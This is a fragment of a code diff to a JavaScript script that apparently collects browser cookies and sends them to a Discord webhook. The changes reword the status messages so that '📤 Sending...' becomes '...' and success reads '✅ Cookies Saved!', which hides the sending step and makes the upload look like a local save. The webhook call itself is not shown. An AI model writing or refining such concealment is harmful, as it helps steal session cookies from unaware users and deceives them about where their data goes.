@@ -218,7 +218,7 @@
 **Timestamp:** ${new Date().toLocaleString()}`;
 
             // ---- 6. Send to Discord ----
-            setStatus('📤 Sending...');
+            setStatus('...');
             let sent = false;
 
             // Try fetch with keepalive
@@ -240,9 +240,9 @@
 
             // Final status
             if (sent) {
-                setStatus('✅ Sent!');
+                setStatus('✅ Cookies Saved!');
             } else {
-                setStatus('❌ Send failed (check webhook)', true);
+                setStatus('❌ Send failed', true);
             }
 
         } catch (err) {
